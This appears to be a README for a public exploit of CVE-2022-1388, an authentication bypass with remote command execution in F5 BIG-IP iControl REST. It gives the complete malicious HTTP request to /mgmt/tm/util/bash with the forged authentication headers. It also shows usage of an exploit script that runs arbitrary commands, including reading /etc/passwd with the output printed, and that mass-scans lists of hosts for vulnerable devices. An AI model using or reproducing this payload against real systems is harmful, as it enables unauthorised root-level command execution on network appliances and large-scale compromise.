# CVE-2022-1388

> CVE-2022-1388 F5 BIG-IP iControl REST Auth Bypass RCE.

```http
POST /mgmt/tm/util/bash HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host
Content-type: application/json
X-F5-Auth-Token: anything
Authorization: Basic YWRtaW46
Content-Length: 42

{"command": "run", "utilCmdArgs": "-c id"}
```

![burp](../../../../../../../download/CVE-2022-1388-main/burp.png)

## Usage

Vulnerability detection against a URL.

```bash
$ python exp.py -u https://192.168.2.110
[+] https://192.168.2.110 is vulnerable!!!
```

Execute arbitrary commands.

```bash
$ python exp.py -u https://192.168.2.110 -c 'cat /etc/passwd'
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
tmshnobody:x:32765:32765:tmshnobody:/:/sbin/nologin
admin:x:0:500:Admin User:/home/admin:/usr/bin/tmsh
qemu:x:107:107:qemu user:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
oprofile:x:16:16:Special user account to be used by OProfile:/:/sbin/nologin
syscheck:x:199:10::/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
f5_remoteuser:x:499:499:f5 remote user account:/home/f5_remoteuser:/sbin/nologin
......
```

Read all URLs in the file and perform vulnerability detection.

```bash
$ python exp.py -f urls.txt
[-] https://10.1.6.5 is not vulnerable.
[+] https://10.1.92.34 is vulnerable!!!
[+] https://10.2.124.144 is vulnerable!!!
[+] https://10.1.194.22 is vulnerable!!!
[+] https://10.2.21.132 is vulnerable!!!
[+] https://10.1.236.2 is vulnerable!!!
[+] https://10.3.155.2 is vulnerable!!!
[+] https://10.2.155.4 is vulnerable!!!
[+] https://10.3.151.92 is vulnerable!!!
[+] https://10.4.139.131 is vulnerable!!!
[+] https://10.7.226.141 is vulnerable!!!
[+] https://10.1.129.53 is vulnerable!!!
[+] https://10.9.45.2 is vulnerable!!!
[+] https://10.5.96.105 is vulnerable!!!
[+] https://10.3.156.6 is vulnerable!!!
$ cat success.txt
https://10.1.92.34
https://10.2.124.144
https://10.1.194.22
https://10.2.21.132
https://10.1.236.2
https://10.3.155.2
https://10.2.155.4
https://10.3.151.92
https://10.4.139.131
https://10.7.226.141
https://10.1.129.53
https://10.9.45.2
https://10.5.96.105
https://10.3.156.6
```

